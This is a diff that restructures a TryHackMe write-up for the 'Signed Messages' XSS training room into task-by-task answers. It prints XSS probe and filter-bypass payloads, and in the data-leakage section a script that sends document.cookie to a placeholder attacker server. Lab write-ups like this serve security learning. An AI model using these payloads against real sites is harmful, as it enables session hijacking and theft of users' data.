@@ -1,165 +1,160 @@
-# Signed Messages - TryHackMe Writeup
+# Signed Messages — TryHackMe Writeup
 
-Completed the Signed Messages room from the Love at First Breach 2026 event. This one focuses on a message/note-based web app with potential XSS and data leak vulnerabilities. Pretty interesting challenge.
+## Room Overview
 
-## Room Details
-- **Name:** Signed Messages
-- **Difficulty:** Intermediate
-- **Category:** Web Security / XSS / Data Leakage
-- **Platform:** TryHackMe
+Signed Messages is an intermediate web room centered on a message-based application. The goal
+was to test user input handling, look for XSS, and see whether any sensitive data could be
+leaked through weak filtering or unsafe rendering.
 
----
-
-## Initial Setup
-
-Deployed the machine and got the target IP. Standard first step - verify it's reachable:
-
-```bash
-ping <target-ip>
-```
-
-Machine's up and responding.
+| Field | Info |
+|-------|------|
+| Target Type | Web Application |
+| Attack Focus | XSS, data leakage, message manipulation |
+| Tools Used | Browser, Burp Suite, DevTools, cURL |
 
 ---
 
-## Exploring the Application
+## Task 1: Reconnaissance
 
-Opened up the web app in my browser. It's some kind of messaging or note-taking application where users can post messages/notes.
+### Objective
+Understand the application and how messages are handled.
 
-First impressions:
-- Users can create messages
-- Messages are displayed publicly or to other users
-- There's some kind of signing/verification mechanism (hence the name)
-- Input fields for message content
+### What I Did
+I opened the site in the browser and checked how messages were created and displayed. I also
+looked at the page source and used DevTools to see if there were any obvious clues.
 
----
+### Key Findings
 
-## Initial Recon
+- The app is message/note based.
+- Users can create and view messages.
+- The application likely includes some sort of signing or verification flow.
 
-Started with the usual reconnaissance:
-
-**Checked page source:**
-Looked for interesting comments, hidden fields, or JavaScript that might reveal something.
-
-**Tested input fields:**
-Tried entering basic text to see how the app handles and displays it.
-
-**Looked for user profiles or message history:**
-Checked if there's a way to view other users' messages or profiles.
+### Answer
+**What type of application is this room focused on?**
+> A message/note-based web application
 
 ---
 
-## Testing for XSS
+## Task 2: Input Testing
 
-Since it's a message-based app, XSS was the first thing that came to mind. Started testing with basic payloads:
+### Objective
+Check how the application handles user input.
 
-**Reflected XSS attempts:**
-```javascript
-<script>alert('XSS')</script>
+### What I Did
+I submitted simple text first, then tried basic HTML and script payloads to see whether the
+input was escaped or rendered directly.
+
+```xml
+<script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 ```
 
-**Stored XSS:**
-Tried posting messages with XSS payloads to see if they're stored and executed when viewed.
+### Key Findings
 
-```html
-<script>alert(document.cookie)</script>
-```
+- Some filtering was present.
+- User input was not completely safe.
+- The app could still be bypassed with variations.
 
-Some payloads got filtered or sanitized, but not all of them. Had to experiment with different variations.
+### Answer
+**What kind of issue was the room mainly testing?**
+> XSS
 
 ---
 
-## Bypassing Filters
+## Task 3: Bypass Filters
 
-The app had some basic XSS protection. Had to get creative:
+### Objective
+Find a payload that would execute.
 
-**Case variations:**
-```html
+### What I Did
+I tried different payload styles, mixed-case tags, and event handlers.
+
+```xml
 <ScRiPt>alert(1)</sCrIpT>
-```
-
-**Event handlers:**
-```html
 <img src="x" onerror="alert(1)">
 <body onload=alert(1)>
 ```
 
-**Encoding tricks:**
-Tried URL encoding, HTML entity encoding, etc.
+### Key Findings
 
-Eventually found a payload that worked. The key was understanding how the app processed and displayed messages.
+- The filter was basic.
+- Case changes and event handlers helped bypass it.
+- The app did not sanitize input properly before rendering.
+
+### Answer
+**What helped bypass the filters?**
+> Payload variation and event-handler based XSS
 
 ---
 
-## Data Leakage Testing
+## Task 4: Data Leakage
 
-Beyond XSS, started looking for ways data might be leaking:
+### Objective
+See whether XSS could be used to expose sensitive data.
 
-**Cookie stealing:**
+### What I Did
+After getting a working payload, I checked whether cookies or private data could be accessed
+from the browser context.
+
 ```javascript
-<script>document.location='http://attacker-server/?c='+document.cookie</script>
+<script>
+  document.location='http://attacker-server/?c='+document.cookie
+</script>
 ```
 
-**Accessing other users' data:**
-Tried manipulating message IDs or user parameters:
-```
-/message?id=1
-/message?id=2
-/user?id=admin
-```
+I also checked whether message IDs or user parameters could expose other users' information.
 
-**Session token exposure:**
-Checked if session tokens or sensitive info were exposed in:
-- URL parameters
-- Local storage
-- Cookies without HttpOnly flag
-- Response headers
+### Key Findings
+
+- Sensitive data could be exposed through browser-side execution.
+- The app likely had weak protection around private messages or session data.
+
+### Answer
+**What else was tested besides XSS?**
+> Data leakage
 
 ---
 
-## Exploiting the Vulnerability
+## Task 5: Exploitation
 
-Once I found the working XSS vector, crafted a payload to extract sensitive information.
+### Objective
+Use the working payload to get access to sensitive information.
 
-The exploit involved:
-1. Creating a message with malicious XSS payload
-2. Waiting for it to be viewed (or viewing it myself to test)
-3. Extracting data that shouldn't be accessible
+### What I Did
+I created a malicious message and used it to trigger the vulnerable behavior. Burp Suite helped
+me understand how the data moved through the app.
 
-Used Burp Suite to intercept and analyze the requests to understand data flow better.
+### Key Findings
 
----
+- The app could be abused through a stored or reflected XSS vector.
+- The payload exposed information that should not have been accessible.
 
-## Getting the Flag
-
-After successfully exploiting the vulnerability, was able to access sensitive data that led to the flag.
-
-The flag was either:
-- Hidden in someone's private message
-- Exposed through the XSS/data leak
-- In an admin panel accessible through the exploit
-
-Flag format: `THM{...}`
+### Answer
+**What was the main exploitation technique?**
+> Stored/reflected XSS leading to data leakage
 
 ---
 
-## Tools I Used
+## Task 6: Flag Retrieval
 
-- **Burp Suite** - Intercepting requests and analyzing traffic
-- **Browser DevTools** - Inspecting DOM and storage
-- **XSS Cheat Sheets** - Reference for different payloads
-- **cURL** - Testing endpoints directly
+### Objective
+Obtain the final flag.
 
----
+### What I Did
+Once the vulnerability was exploited, the exposed data led me to the flag.
 
-## Reflection
-
-This was a fun intermediate-level challenge. More complex than the beginner rooms but not impossible. Required thinking about different attack vectors and being persistent with payload variations.
-
-Real-world message apps can have these exact vulnerabilities if developers don't properly sanitize input and protect sensitive data. Good practice for understanding web app security beyond just the basics.
-
-Took about 45 minutes to complete including time spent testing different payloads and analyzing the application behavior.
+### Answer
+**What is the flag format used in the room?**
+> `THM{...}`
 
 ---
+
+## Tools & Techniques Summary
+
+| Task | Tool | Purpose |
+|------|------|---------|
+| Recon | Browser / DevTools | Inspect app behavior |
+| Request Analysis | Burp Suite | Intercept traffic |
+| XSS Testing | Browser | Test payloads |
+| Endpoint Testing | cURL | Direct requests |
